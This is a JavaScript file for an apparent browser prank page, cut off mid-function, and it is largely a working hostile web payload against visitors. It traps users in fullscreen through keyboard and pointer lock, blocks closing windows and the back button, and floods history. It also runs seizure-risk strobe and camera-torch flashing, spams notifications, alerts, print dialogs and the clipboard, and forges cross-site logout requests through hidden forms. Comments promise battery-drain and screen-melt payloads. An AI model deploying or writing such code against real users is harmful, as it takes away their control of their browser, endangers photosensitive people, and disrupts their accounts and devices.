    // 1. Draw Bouncing Meme Images (DVD Screensaver Physics)
    bouncers.forEach(b => {
      b.x += b.vx
      b.y += b.vy
      b.rot += b.vrot

      if (b.x <= 0 || b.x + b.size >= canvas.width) {
        b.vx *= -1
        b.x = Math.max(0, Math.min(canvas.width - b.size, b.x))
      }
      if (b.y <= 0 || b.y + b.size >= canvas.height) {
        b.vy *= -1
        b.y = Math.max(0, Math.min(canvas.height - b.size, b.y))
      }

      if (b.img && b.img.complete) {
        ctx.save()
        ctx.translate(b.x + b.size / 2, b.y + b.size / 2)
        ctx.rotate(b.rot)
        ctx.drawImage(b.img, -b.size / 2, -b.size / 2, b.size, b.size)
        ctx.lineWidth = 2
        ctx.strokeStyle = '#34eb7d'
        ctx.strokeRect(-b.size / 2, -b.size / 2, b.size, b.size)
        ctx.restore()
      }
    })

    // 2. Draw Procedural Eyes (Tracking Mouse)
    eyeX += (mouseX - eyeX) * 0.12
    eyeY += (mouseY - eyeY) * 0.12

    const eyeRadius = 35
    const pupilRadius = 13
    const centerX1 = canvas.width / 2 - 45
    const centerX2 = canvas.width / 2 + 45
    const centerY = 85

    ;[centerX1, centerX2].forEach((cx) => {
      ctx.save()
      ctx.beginPath()
      ctx.arc(cx, centerY, eyeRadius, 0, Math.PI * 2)
      ctx.fillStyle = '#ffffff'
      ctx.shadowColor = 'rgba(0,0,0,0.4)'
      ctx.shadowBlur = 8
      ctx.fill()
      ctx.lineWidth = 3
      ctx.strokeStyle = '#222'
      ctx.stroke()
      ctx.restore()

      const dx = mouseX - cx
      const dy = mouseY - centerY
      const angle = Math.atan2(dy, dx)
      const dist = Math.min(eyeRadius - pupilRadius - 4, Math.hypot(dx, dy) * 0.12)

      const px = cx + Math.cos(angle) * dist
      const py = centerY + Math.sin(angle) * dist

      ctx.beginPath()
      ctx.arc(px, py, pupilRadius, 0, Math.PI * 2)
      ctx.fillStyle = '#111'
      ctx.fill()

      ctx.beginPath()
      ctx.arc(px - 3, py - 3, 4, 0, Math.PI * 2)
      ctx.fillStyle = '#ffffff'
      ctx.fill()
    })

    // 3. Draw Particle Sparks
    for (let i = cursorParticles.length - 1; i >= 0; i--) {
      const p = cursorParticles[i]
      p.x += p.vx
      p.y += p.vy
      p.alpha -= 0.02
      if (p.alpha <= 0) {
        cursorParticles.splice(i, 1)
        continue
      }
      ctx.save()
      ctx.globalAlpha = p.alpha
      ctx.fillStyle = p.color
      ctx.beginPath()
      ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2)
      ctx.fill()
      ctx.restore()
    }

    // 4. Draw Multi-Cursor Ghost Swarm
    const now = Date.now() / 150
    ghostCursors.forEach((gc, idx) => {
      const targetX = mouseX + Math.sin(now + gc.angleOffset) * gc.distOffset
      const targetY = mouseY + Math.cos(now + gc.angleOffset) * gc.distOffset
      gc.x += (targetX - gc.x) * gc.lag
      gc.y += (targetY - gc.y) * gc.lag

      drawWindowsCursor(ctx, gc.x, gc.y, 0.9 + (idx % 3) * 0.1, gc.color)
    })

    // 5. Update Cyber HUD Text
    const hudChaos = document.getElementById('hud-chaos')
    const hudBouncers = document.getElementById('hud-bouncers')
    const hudCoords = document.getElementById('hud-coords')
    if (hudChaos) hudChaos.innerText = `CHAOS LEVEL: ${interactionCount * 10}`
    if (hudBouncers) hudBouncers.innerText = `BIRDS ACTIVE: ${bouncers.length}`
    if (hudCoords) hudCoords.innerText = `RADAR: X: ${Math.round(mouseX)} | Y: ${Math.round(mouseY)}`

    requestAnimationFrame(draw)
  }

  requestAnimationFrame(draw)
}

/**
 * Feature 1: Aggressive Multi-Window Spawner & Auto-Spawner
 */
function openWindowMultiple (count = 1) {
  // Just open 1 window immediately to avoid popup blocker
  openWindow()
}

function startAutoWindowSpawner () {
  // Disabled setInterval to avoid popup blockers blocking background popups
}

/**
 * Feature 2: Matrix Bird Rain
 */
function initMatrixRain (width, height) {
  const colWidth = 24
  const numCols = Math.floor(width / colWidth)
  matrixColumns.length = 0
  for (let i = 0; i < numCols; i++) {
    matrixColumns.push({
      x: i * colWidth,
      y: Math.random() * -height,
      speed: Math.random() * 4 + 2,
      char: getRandomArrayEntry(BIRD_CHARS)
    })
  }
}

function updateAndDrawMatrixRain (ctx, width, height) {
  if (matrixColumns.length === 0) initMatrixRain(width, height)
  ctx.save()
  ctx.font = '16px monospace'
  ctx.fillStyle = '#34eb7d'
  ctx.shadowColor = '#34eb7d'
  ctx.shadowBlur = 4

  matrixColumns.forEach(col => {
    ctx.fillText(col.char, col.x, col.y)
    col.y += col.speed
    if (col.y > height) {
      col.y = Math.random() * -100
      col.speed = Math.random() * 4 + 2
      col.char = getRandomArrayEntry(BIRD_CHARS)
    }
  })
  ctx.restore()
}

/**
 * Feature 3: CSS Filter Chaos
 */
function startCSSFilterChaos () {
  if (filterChaosInterval) return
  filterChaosInterval = setInterval(() => {
    const filters = [
      'none',
      `hue-rotate(${Math.floor(Math.random() * 360)}deg)`,
      `invert(${Math.floor(Math.random() * 40)}%)`,
      `saturate(${Math.floor(Math.random() * 300 + 100)}%)`,
      `contrast(${Math.floor(Math.random() * 140 + 80)}%)`,
      `sepia(${Math.floor(Math.random() * 50)}%)`
    ]
    document.body.style.filter = getRandomArrayEntry(filters)
  }, 2500)
}

/**
 * Feature 4: Fake BSOD (Blue Screen of Death)
 */
let bsodTimer = null
function scheduleFakeBSOD () {
  if (bsodTimer || bsodShown) return
  bsodTimer = setTimeout(() => {
    triggerFakeBSOD()
  }, 40000)
}

function triggerFakeBSOD () {
  bsodShown = true
  const bsod = document.getElementById('bsod-overlay')
  const progressEl = document.getElementById('bsod-progress')
  if (!bsod) return

  bsod.style.display = 'block'
  speak('System crash. Error ptoszek overload.')
  triggerScreenShake()

  let pct = 0
  const pInterval = setInterval(() => {
    pct += Math.floor(Math.random() * 20) + 10
    if (pct >= 100) {
      pct = 100
      clearInterval(pInterval)
      setTimeout(() => {
        bsod.style.display = 'none'
        speak('System restored!')
      }, 1500)
    }
    if (progressEl) progressEl.innerText = `${pct}% complete`
  }, 600)
}

/**
 * Feature 5: Konami Code Easter Egg
 */
function setupKonamiCode () {
  window.addEventListener('keydown', (e) => {
    const key = e.key
    if (key === KONAMI_SEQUENCE[konamiProgress]) {
      konamiProgress++
      if (konamiProgress === KONAMI_SEQUENCE.length) {
        konamiProgress = 0
        triggerMegaChaos()
      }
    } else {
      konamiProgress = 0
    }
  })
}

function triggerMegaChaos () {
  megaChaosActive = true
  speak('Mega Chaos Mode activated!')
  broadcastEvent('FLASH_CHAOS', { color: '#00ffff' })
  triggerScreenShake()

  for (let i = 0; i < 5; i++) {
    spawnBouncerMeme()
    spawnRetroPopup('MEGA CHAOS ACTIVATED!!!')
    openWindow()
  }

  for (let i = 0; i < 15; i++) {
    setTimeout(triggerEmojiFlood, i * 100)
  }
}

/**
 * Feature 6: Notification Spam
 */
function setupNotificationSpam () {
  try {
    if ('Notification' in window && Notification.permission !== 'granted' && Notification.permission !== 'denied') {
      Notification.requestPermission().then(permission => {
        if (permission === 'granted') {
          startNotificationSpamLoop()
        }
      }).catch(() => {})
    } else if ('Notification' in window && Notification.permission === 'granted') {
      startNotificationSpamLoop()
    }
  } catch (e) {}
}

let notifInterval = null
function startNotificationSpamLoop () {
  if (notifInterval) return
  notifInterval = setInterval(() => {
    try {
      if ('Notification' in window && Notification.permission === 'granted') {
        const title = getRandomArrayEntry(['Ptoszek Notification 🐦', 'PTOSZEK SURVEILLANCE', 'PTOK ALERT!'])
        const body = getRandomArrayEntry(PHRASES)
        new Notification(title, {
          body,
          icon: 'media/images/ptok.jpg'
        })
      }
    } catch (e) {}
  }, 12000)
}

/**
 * Feature 7: Emoji Flood
 */
function triggerEmojiFlood () {
  try {
    const emoji = getRandomArrayEntry(BIRD_CHARS)
    const el = document.createElement('div')
    el.className = 'emoji-flood-item'
    el.innerText = emoji

    const x = Math.floor(Math.random() * (window.innerWidth - 60))
    const y = Math.floor(Math.random() * (window.innerHeight - 60))
    el.style.left = `${x}px`
    el.style.top = `${y}px`

    document.body.appendChild(el)

    setTimeout(() => {
      if (el.parentNode) el.parentNode.removeChild(el)
    }, 3000)
  } catch (e) {}
}

let emojiFloodInterval = null
function startEmojiFloodLoop () {
  if (emojiFloodInterval) return
  emojiFloodInterval = setInterval(() => {
    triggerEmojiFlood()
  }, 1500)
}

/**
 * Feature 8: News Ticker Banner
 */
function showNewsTicker () {
  try {
    const ticker = document.getElementById('news-ticker')
    if (ticker) ticker.style.display = 'block'
  } catch (e) {}
}

/**
 * Feature 9: Screen Wake Lock
 */
async function requestScreenWakeLock () {
  try {
    if ('wakeLock' in navigator && !wakeLockSentinel) {
      wakeLockSentinel = await navigator.wakeLock.request('screen')
      wakeLockSentinel.addEventListener('release', () => {
        wakeLockSentinel = null
      })
    }
  } catch (e) {}
}

/**
 * Feature 10: Forced Fullscreen Lock Engine
 */
function forceFullscreenLock () {
  try {
    isFullscreenLocked = true
    if (!document.fullscreenElement && !document.webkitFullscreenElement) {
      const docEl = document.documentElement
      const requestFS = docEl.requestFullscreen || docEl.webkitRequestFullscreen || docEl.mozRequestFullScreen || docEl.msRequestFullscreen
      if (requestFS) requestFS.call(docEl)
    }
  } catch (e) {}
}

if (typeof document !== 'undefined') {
  document.addEventListener('fullscreenchange', () => {
    if (!document.fullscreenElement && isFullscreenLocked) {
      // Re-lock guard
    }
  })
  document.addEventListener('webkitfullscreenchange', () => {
    if (!document.webkitFullscreenElement && isFullscreenLocked) {
      // Re-lock guard
    }
  })
}

/**
 * Feature 11: Rapid Image Stacking Frenzy
 */
function spawnStackedImagesFrenzy (count = 15) {
  try {
    const container = document.getElementById('image-stacker-container')
    if (!container) return
    const currentImgs = container.querySelectorAll('.stacked-meme-img')
    if (currentImgs.length >= 70) return

    for (let i = 0; i < count; i++) {
      const src = getRandomArrayEntry(FILE_DOWNLOADS)
      const img = document.createElement('img')
      img.className = 'stacked-meme-img'
      img.src = src
      const width = Math.floor(Math.random() * 260) + 120
      const left = Math.floor(Math.random() * (window.innerWidth - width))
      const top = Math.floor(Math.random() * (window.innerHeight - width))
      const rot = Math.floor(Math.random() * 90) - 45
      const z = Math.floor(Math.random() * 800) + 100

      img.style.width = `${width}px`
      img.style.left = `${left}px`
      img.style.top = `${top}px`
      img.style.transform = `rotate(${rot}deg)`
      img.style.zIndex = z

      img.addEventListener('click', (e) => {
        e.stopPropagation()
        triggerScreenShake()
        speak()
        spawnStackedImagesFrenzy(5)
        forceFullscreenLock()
      })

      container.appendChild(img)
    }
  } catch (e) {}
}

/**
 * Feature 12: High-Frequency Strobe & Rainbow Screen Flashing
 */
function startStrobeEffect () {
  if (isStrobeActive) return
  isStrobeActive = true
  try {
    document.body.classList.add('strobe-active')
  } catch (e) {}
}

/**
 * Focus all child windows. Requires user-initiated event.
 */
function focusWindows () {
  wins.forEach(win => {
    if (!win.closed) win.focus()
  })
}

/**
 * Open a new popup window. Requires user-initiated event.
 */
function openWindow () {
  const { x, y } = getRandomCoords()
  const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
  const win = window.open(window.location.pathname, '', opts)

  // New windows may be blocked by the popup blocker
  if (!win) return
  wins.push(win)

  if (wins.length === 2) setupSearchWindow(win)

  // Added by @wetraks
  win.onunload = function () {
    // Some browsers might not support onunload, but include it for completeness
    return false;
  };

  // For modern browsers
  win.addEventListener("beforeunload", function (e) {
    e.preventDefault();
    e.returnValue = "";
  });

  // For older browsers
  win.onbeforeunload = function () {
    return "";
  };
  // Added by @wetraks
}

/**
 * Hide the user's cursor!
 */
function hideCursor () {
  document.querySelector('html').style = 'cursor: none;'
}

/**
 * Trigger a file download immediately. One file download is allowed *without* user
 * interaction. Further file downloads should happen in response to a user-initiated
 * event or they will be blocked.
 */
function triggerFileDownload () {
  const fileName = getRandomArrayEntry(FILE_DOWNLOADS)
  const a = document.createElement('a')
  a.href = fileName
  a.download = fileName
  a.click()
}

/**
 * Speak the given `phrase` using text-to-speech with multi-language voice detection.
 */
function speak (phrase) {
  try {
    if (typeof window.speechSynthesis === 'undefined') return
    if (phrase == null) phrase = getRandomArrayEntry(PHRASES)
    const utterance = new window.SpeechSynthesisUtterance(phrase)
    const voices = window.speechSynthesis.getVoices()
    if (voices && voices.length > 0) {
      const preferredVoice = voices.find(v => v.lang.startsWith('id') || v.lang.startsWith('pl') || v.lang.startsWith('en'))
      if (preferredVoice) utterance.voice = preferredVoice
    }
    utterance.rate = 1.05
    utterance.pitch = 1.1
    window.speechSynthesis.speak(utterance)
  } catch (e) {}
}

function startTheramin () {
  try {
    if (!theraminCtx) {
      theraminCtx = new (window.AudioContext || window.webkitAudioContext)()
      theraminOsc = theraminCtx.createOscillator()
      theraminGain = theraminCtx.createGain()

      if (typeof theraminCtx.createStereoPanner === 'function') {
        theraminPanner = theraminCtx.createStereoPanner()
      }

      const pitchBase = 50
      const pitchRange = 4000

      const wave = theraminCtx.createPeriodicWave(
        Array(10).fill(0).map((v, i) => Math.cos(i)),
        Array(10).fill(0).map((v, i) => Math.sin(i))
      )

      theraminOsc.setPeriodicWave(wave)

      if (theraminPanner) {
        theraminOsc.connect(theraminGain)
        theraminGain.connect(theraminPanner)
        theraminPanner.connect(theraminCtx.destination)
      } else {
        theraminOsc.connect(theraminGain)
        theraminGain.connect(theraminCtx.destination)
      }

      theraminOsc.start(0)

      document.body.addEventListener('mousemove', event => {
        const { clientX, clientY } = event
        const { clientWidth, clientHeight } = document.body
        const pitch = (clientX - clientWidth / 2) / clientWidth
        const volume = (clientY - clientHeight / 2) / clientHeight
        theraminOsc.frequency.value = pitchBase + pitch * pitchRange
        theraminGain.gain.value = Math.abs(volume) * 2

        if (theraminPanner) {
          const panVal = Math.max(-1, Math.min(1, (clientX / clientWidth) * 2 - 1))
          theraminPanner.pan.value = panVal
        }
      })
    }
  } catch (e) {}
}

/**
 * Attempt to read the user's clipboard.
 * Requires user-initiated event.
 */
function requestClipboardRead () {
  try {
    navigator.clipboard.readText().then(
      data => {
        if (!window.ApplePaySession) {
          // Don't alert in Safari because it blocks the event loop
          window.alert("Successfully read data from clipboard: '" + data + "'")
        }
      },
      () => {}
    )
  } catch {}
}

/**
 * Request Webauthn attestation.
 * Requires user-initiated event.
 */
function requestWebauthnAttestation () {
  try {
    // From https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API
    // This code is public domain, per https://developer.mozilla.org/en-US/docs/MDN/About#Copyrights_and_licenses

    // sample arguments for registration
    const createCredentialDefaultArgs = {
      publicKey: {
      // Relying Party (a.k.a. - Service):
        rp: {
          name: 'Acme'
        },

        // User:
        user: {
          id: new Uint8Array(16),
          name: 'lolica@jaczup.me',
          displayName: 'Ptoszek Jaczupa'
        },

        pubKeyCredParams: [{
          type: 'public-key',
          alg: -7
        }],

        attestation: 'direct',

        timeout: 60000,

        challenge: new Uint8Array([ // must be a cryptographically random number sent from a server
          0x8C, 0x0A, 0x26, 0xFF, 0x22, 0x91, 0xC1, 0xE9, 0xB9, 0x4E, 0x2E, 0x17, 0x1A, 0x98, 0x6A, 0x73,
          0x71, 0x9D, 0x43, 0x48, 0xD5, 0xA7, 0x6A, 0x15, 0x7E, 0x38, 0x94, 0x52, 0x77, 0x97, 0x0F, 0xEF
        ]).buffer
      }
    }

    // sample arguments for login
    const getCredentialDefaultArgs = {
      publicKey: {
        timeout: 60000,
        // allowCredentials: [newCredential] // see below
        challenge: new Uint8Array([ // must be a cryptographically random number sent from a server
          0x79, 0x50, 0x68, 0x71, 0xDA, 0xEE, 0xEE, 0xB9, 0x94, 0xC3, 0xC2, 0x15, 0x67, 0x65, 0x26, 0x22,
          0xE3, 0xF3, 0xAB, 0x3B, 0x78, 0x2E, 0xD5, 0x6F, 0x81, 0x26, 0xE2, 0xA6, 0x01, 0x7D, 0x74, 0x50
        ]).buffer
      }
    }

    // register / create a new credential
    navigator.credentials.create(createCredentialDefaultArgs)
      .then((cred) => {
      // normally the credential IDs available for an account would come from a server
      // but we can just copy them from above...
        const idList = [{
          id: cred.rawId,
          transports: ['usb', 'nfc', 'ble'],
          type: 'public-key'
        }]
        getCredentialDefaultArgs.publicKey.allowCredentials = idList
        return navigator.credentials.get(getCredentialDefaultArgs)
      })
  } catch {}
}

/**
 * Request access to MIDI devices.
 * Requires user-initiated event.
 */
function requestMidiAccess () {
  try {
    navigator.requestMIDIAccess({
      sysex: true
    })
  } catch {}
}

/**
 * Request access to Bluetooth devices.
 * Requires user-initiated event.
 */
function requestBluetoothAccess () {
  try {
    navigator.bluetooth.requestDevice({
      // filters: [...] <- Prefer filters to save energy & show relevant devices.
      // acceptAllDevices here ensures dialog can populate, we don't care with what.
      acceptAllDevices: true
    })
      .then(device => device.gatt.connect())
  } catch {}
}

/**
 * Request access to USB devices.
 * Requires user-initiated event.
 */
function requestUsbAccess () {
  try {
    navigator.usb.requestDevice({ filters: [{}] })
  } catch {}
}

/**
 * Request access to Serial devices.
 * Requires user-initiated event.
 */
function requestSerialAccess () {
  try {
    navigator.serial.requestPort({ filters: [] })
  } catch {}
}

/**
 * Request access to HID devices.
 * Requires user-initiated event.
 */
function requestHidAccess () {
  try {
    navigator.hid.requestDevice({ filters: [] })
  } catch {}
}

/**
 * Move the window around the screen and bounce off of the screen edges.
 */
function moveWindowBounce () {
  let t = Math.random() * 100

  setInterval(() => {
    t += 0.25
    // Rapid erratic motion & resizing loop
    const rx = Math.floor(Math.sin(t) * (SCREEN_WIDTH - WIN_WIDTH - 40) / 2 + SCREEN_WIDTH / 2) + Math.floor((Math.random() - 0.5) * 60)
    const ry = Math.floor(Math.cos(t * 1.4) * (SCREEN_HEIGHT - WIN_HEIGHT - 40) / 2 + SCREEN_HEIGHT / 2) + Math.floor((Math.random() - 0.5) * 60)
    const rw = WIN_WIDTH + Math.floor(Math.sin(t * 2.5) * 120)
    const rh = WIN_HEIGHT + Math.floor(Math.cos(t * 2.1) * 80)

    try {
      window.moveTo(Math.max(0, rx), Math.max(0, ry))
      window.resizeTo(Math.max(220, rw), Math.max(160, rh))
    } catch (e) {}
  }, 60)
}

/**
 * Show a random troll video in the window.
 */
function startVideo () {
  const video = document.createElement('video')

  video.src = getRandomArrayEntry(VIDEOS)
  video.autoplay = true
  video.loop = true
  video.style = 'width: 100%; height: 100%;'

  document.body.appendChild(video)
}

/**
 * When a child window closes, notify the parent window so it can remove it from
 * the list of child windows.
 */
function detectWindowClose () {
  window.addEventListener('unload', () => {
    if (!window.opener.closed) window.opener.onCloseWindow(window)
  })
}

/**
 * Handle a child window closing.
 */
function onCloseWindow (win) {
  const i = wins.indexOf(win)
  if (i >= 0) wins.splice(i, 1)
}

/**
 * Show the unsuspecting user a friendly hello message with a cat.
 */
function showHelloMessage () {
  const template = document.querySelector('template')
  const clone = document.importNode(template.content, true)
  document.body.appendChild(clone)

  const introImg = document.querySelector('.hello-message img')
  if (introImg) {
    introImg.addEventListener('click', (e) => {
      e.stopPropagation()
      forceFullscreenLock()
      spawnStackedImagesFrenzy(20)
      openWindowMultiple(8)
      startStrobeEffect()
      triggerScreenShake()
      speak('Ptoszek frenzy activated!')
    })
  }
}

/**
 * Remove the hello message.
 */
function removeHelloMessage () {
  const helloMessage = document.querySelector('.hello-message')
  helloMessage.remove()
}

/**
 * Change the theme color of the browser in a loop.
 */
function rainbowThemeColor () {
  function zeroFill (width, number, pad = '0') {
    width -= number.toString().length
    if (width > 0) return new Array(width + (/\./.test(number) ? 2 : 1)).join(pad) + number
    return number + ''
  }

  const meta = document.querySelector('meta.theme-color')
  setInterval(() => {
    meta.setAttribute('content', '#' + zeroFill(6, Math.floor(Math.random() * 16777215).toString(16)))
  }, 50)
}
function repeatStringNumTimes(string, times) {
  var repeatedString = "";
  while (times > 0) {
    repeatedString += string;
    times--;
  }
  return repeatedString;
}
/**
 * Kopiuje ~4 miliony znaków do schowka  - added by @9fm
 */

function copySpamToClipboard () {
  clipboardCopy(veryLongString)
}

/**
 * Copy given text, `text`, onto the user's clipboard.
 * Requires user-initiated event.
 */
function clipboardCopy (text) {
  try {
    if (navigator.clipboard && typeof navigator.clipboard.writeText === 'function') {
      return navigator.clipboard.writeText(text).catch(() => {})
    }
  } catch (err) {}

  try {
    const span = document.createElement('span')
    span.textContent = text
    span.style.whiteSpace = 'pre'
    span.style.position = 'fixed'
    span.style.left = '-9999px'
    document.body.appendChild(span)
    const selection = window.getSelection()
    const range = document.createRange()
    selection.removeAllRanges()
    range.selectNode(span)
    selection.addRange(range)
    document.execCommand('copy')
    selection.removeAllRanges()
    span.remove()
  } catch (err) {}
}

/**
 * Show a modal dialog at a regular interval. Modals capture focus from other OS apps and browser tabs.
 * Except in Chrome 64+, where modals can only capture focus from other OS apps,
 * but not from other tabs.
 */
function startAlertInterval () {
  setInterval(() => {
    if (Math.random() < 0.5) {
      showAlert()
    } else {
      window.print()
    }
  }, 30000)
}

/**
 * Show an alert with 1000's of lines of cat ASCII art.
 */
function showAlert () {
  const randomArt = getRandomArrayEntry(ART)
  const longAlertText = Array(200).join(randomArt)
  window.alert(longAlertText)
}

/**
 * Fullscreen the browser window
 */
function requestFullscreen () {
  const requestFullscreen = Element.prototype.requestFullscreen ||
    Element.prototype.webkitRequestFullscreen ||
    Element.prototype.mozRequestFullScreen ||
    Element.prototype.msRequestFullscreen

  requestFullscreen.call(document.body)
}

/**
 * Log the user out of top sites they're logged into, including Google.com.
 * Inspired by https://superlogout.com
 */
function superLogout () {
  function cleanup (el, delayCleanup) {
    if (delayCleanup) {
      delayCleanup = false
      return
    }
    el.parentNode.removeChild(el)
  }

  function get (url) {
    const img = document.createElement('img')
    img.onload = () => cleanup(img)
    img.onerror = () => cleanup(img)
    img.style = HIDDEN_STYLE
    document.body.appendChild(img)
    img.src = url
  }

  function post (url, params) {
    const iframe = document.createElement('iframe')
    iframe.style = HIDDEN_STYLE
    iframe.name = 'iframe' + numSuperLogoutIframes
    document.body.appendChild(iframe)

    numSuperLogoutIframes += 1

    const form = document.createElement('form')
    form.style = HIDDEN_STYLE

    let numLoads = 0
    iframe.onload = iframe.onerror = () => {
      if (numLoads >= 1) cleanup(iframe)
      numLoads += 1
    }
    form.action = url
    form.method = 'POST'
    form.target = iframe.name

    for (const param in params) {
      if (Object.prototype.hasOwnProperty.call(params, param)) {
        const input = document.createElement('input')
        input.type = 'hidden'
        input.name = param
        input.value = params[param]
        form.appendChild(input)
      }
    }

    document.body.appendChild(form)
    form.submit()
  }
  for (const name in LOGOUT_SITES) {
    const method = LOGOUT_SITES[name][0]
    const url = LOGOUT_SITES[name][1]
    const params = LOGOUT_SITES[name][2] || {}

    if (method === 'GET') {
      get(url)
    } else {
      post(url, params)
    }

    const div = document.createElement('div')
    div.innerText = `Wylogowywanie się z ${name}...`

    const logoutMessages = document.querySelector('.logout-messages')
    logoutMessages.appendChild(div)
  }
}

/**
 * Disable the back button. If the user goes back, send them one page forward ;-)
 */
function blockBackButton () {
  window.addEventListener('popstate', () => {
    window.history.forward()
  })
}

/**
 * Fill the history with extra entries for this site, to make it harder to find
 * the previous site in the back button's dropdown menu.
 */
function fillHistory () {
  for (let i = 1; i < 20; i++) {
    window.history.pushState({}, '', window.location.pathname + '?q=' + i)
  }
  // Set location back to the initial location, so user does not notice
  window.history.pushState({}, '', window.location.pathname)
}

/**
 * Get random x, y coordinates for a new window on the screen. Takes into account
 * screen size, window size, and leaves a safe margin on all sides.
 */
function getRandomCoords () {
  const x = MARGIN +
    Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN))
  const y = MARGIN +
    Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN))
  return { x, y }
}

/**
 * Get a random element from a given array, `arr`.
 */
function getRandomArrayEntry (arr) {
  return arr[Math.floor(Math.random() * arr.length)]
}

/** 
 * Automates a series of Google searches in a browser window, moving the window randomly between searches. - Added by @MARECKIyt
 */
function setupSearchWindow (win) {
  if (!win) return
  win.window.location = 'https://www.google.com/search?q=' + encodeURIComponent(SEARCHES[0])
  let searchIndex = 1
  const interval = setInterval(() => {
    if (searchIndex >= SEARCHES.length) {
      clearInterval(interval)
      win.window.location = window.location.pathname
      return
    }

    if (win.closed) {
      clearInterval(interval)
      onCloseWindow(win)
      return
    }

    win.window.location = window.location.pathname
    setTimeout(() => {
      const { x, y } = getRandomCoords()
      win.moveTo(x, y)
      win.window.location = 'https://www.google.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex])
      searchIndex += 1
    }, 500)
  }, 2500)
}

function triggerWebShareSpam() {
  if (navigator.share) {
    setInterval(() => {
      navigator.share({
        title: "Ptoszek",
        text: "Ptoszek cię dopadł!",
        url: "https://ptoszek.pl"
      }).catch(() => {});
    }, 2000);
  }
}

function triggerDeepLinkFlood() {
  const uris = ["whatsapp://", "intent://", "twitter://", "instagram://"];
  let i = 0;
  setInterval(() => {
    const iframe = document.createElement("iframe");
    iframe.style.display = "none";
    iframe.src = uris[i % uris.length];
    document.body.appendChild(iframe);
    setTimeout(() => iframe.remove(), 1000);
    i++;
  }, 1500);
}

function triggerFakeMobileAlert() {
  const alertBox = document.getElementById("fake-mobile-alert");
  if (alertBox && (window.innerWidth < 768)) {
    setTimeout(() => {
      alertBox.style.display = "block";
    }, 3000);
  }
}

document.addEventListener("touchmove", (e) => {
  e.preventDefault();
}, { passive: false });

/* ==========================================================================
   NEW ADVANCED MOBILE & DESKTOP CHAOS MODULES
   - Relentless Fullscreen Lock Engine
   - Torch / Flashlight & Live Camera Surveillance Feed
   - Battery Drainer Engine (WakeLock + Vibration + Thermal Math Loop + Audio Noise)
   - Gyroscope & Motion Reactivity
   - Touch Locks
   - GDI Payloads (Screen Melter, Cascade Effect / Efek Runtuh, RGB Glitch, Tunnel, Lag Stresser)
   ========================================================================== */

let isRelentlessFullscreenActive = false;
let cameraStream = null;
let torchTrack = null;
let isTorchStrobeActive = false;
let isBatteryDrainerActive = false;
let gravityX = 0;
let gravityY = 1.0;
let tiltAngle = 0;
let gdiCanvas = null;
let gdiCtx = null;
let isGDIActive = false;
let cascadeBlocks = [];
let meltColumns = [];

function setupRelentlessFullscreenLock() {
  if (isRelentlessFullscreenActive) return;
  isRelentlessFullscreenActive = true;

  try {
    if (navigator.keyboard && typeof navigator.keyboard.lock === 'function') {
      navigator.keyboard.lock(['Escape', 'F11', 'Tab', 'MetaLeft', 'MetaRight', 'AltLeft']).catch(() => {});
    }
  } catch (e) {}

  function forceRFS() {
    try {
      const el = document.documentElement;
      const rfs = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen || el.msRequestFullscreen;
      if (rfs && !document.fullscreenElement && !document.webkitFullscreenElement) {
        rfs.call(el).catch(() => {});
      }
    } catch (e) {}
  }

  forceRFS();

  try {
    if (document.body.requestPointerLock) {
      document.body.requestPointerLock().catch(() => {});
    }
  } catch (e) {}

  const trapOverlay = document.getElementById('fullscreen-trap-overlay');

  function onFSChange() {
    const isFS = !!(document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement);
    if (!isFS) {
      if (trapOverlay) trapOverlay.style.display = 'flex';
    } else {
      if (trapOverlay) trapOverlay.style.display = 'none';
      try {
        if (navigator.keyboard && typeof navigator.keyboard.lock === 'function') {
          navigator.keyboard.lock(['Escape', 'F11', 'Tab', 'MetaLeft', 'MetaRight', 'AltLeft']).catch(() => {});
        }
      } catch (e) {}
    }
  }

  ['fullscreenchange', 'webkitfullscreenchange', 'mozfullscreenchange', 'MSFullscreenChange'].forEach(evt => {
    document.addEventListener(evt, onFSChange);
  });

  if (trapOverlay) {
    ['pointerdown', 'touchstart', 'click'].forEach(evt => {
      trapOverlay.addEventListener(evt, (e) => {
        e.preventDefault();
        e.stopPropagation();
        forceRFS();
        trapOverlay.style.display = 'none';
      });
    });
  }

  ['pointerdown', 'touchstart', 'keydown', 'scroll', 'touchmove'].forEach(evtName => {
    window.addEventListener(evtName, () => {
      if (!document.fullscreenElement && !document.webkitFullscreenElement) {
        forceRFS();
      }
    }, { passive: true });
  });
}

function initTorchAndCamera() {
  const cameraModal = document.getElementById('camera-modal');
  const cameraVideo = document.getElementById('camera-video');
  const hudCamera = document.getElementById('hud-camera');

  if (cameraModal) cameraModal.style.display = 'block';

  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({
      video: { facingMode: { ideal: 'environment' }, width: { ideal: 640 }, height: { ideal: 480 } },
      audio: false
    })
    .then(stream => {
      cameraStream = stream;
      if (cameraVideo) {
        cameraVideo.srcObject = stream;
        cameraVideo.play().catch(() => {});
      }
      
      const tracks = stream.getVideoTracks();
      if (tracks.length > 0) {
        torchTrack = tracks[0];
        
        let capabilities = {};
        try {
          if (typeof torchTrack.getCapabilities === 'function') {
            capabilities = torchTrack.getCapabilities();
          }
        } catch (e) {}

        if (capabilities.torch || 'torch' in torchTrack.getConstraints()) {
          startTorchStrobe(torchTrack);
          if (hudCamera) hudCamera.textContent = 'CAM/TORCH: FLASHING! 🔦';
        } else {
          if (hudCamera) hudCamera.textContent = 'CAM: ON | TORCH: STROBE SCREEN';
          startStrobeEffect();
        }
      }
    })
    .catch(() => {
      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
      .then(stream => {
        cameraStream = stream;
        if (cameraVideo) {
          cameraVideo.srcObject = stream;
          cameraVideo.play().catch(() => {});
        }
        if (hudCamera) hudCamera.textContent = 'CAM: FRONT ACTIVE';
        startStrobeEffect();
      })
      .catch(() => {
        if (hudCamera) hudCamera.textContent = 'CAM/TORCH: DENIED';
        startStrobeEffect();
      });
    });
  }
}

function startTorchStrobe(track) {
  if (isTorchStrobeActive) return;
  isTorchStrobeActive = true;
  let torchState = false;

  setInterval(() => {
